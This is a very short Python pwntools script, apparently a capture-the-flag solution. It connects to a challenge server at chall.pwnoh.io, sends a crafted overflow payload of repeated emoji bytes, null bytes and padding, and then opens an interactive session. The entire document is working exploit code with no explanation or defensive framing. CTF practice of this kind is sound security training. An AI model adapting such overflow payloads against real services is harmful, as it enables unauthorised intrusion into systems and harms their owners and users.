from pwn import *

io = remote('chall.pwnoh.io', 13370)

payload = b'😀'*1862 + b'\0'*8 + b'a'*100
io.sendline(payload)
io.interactive()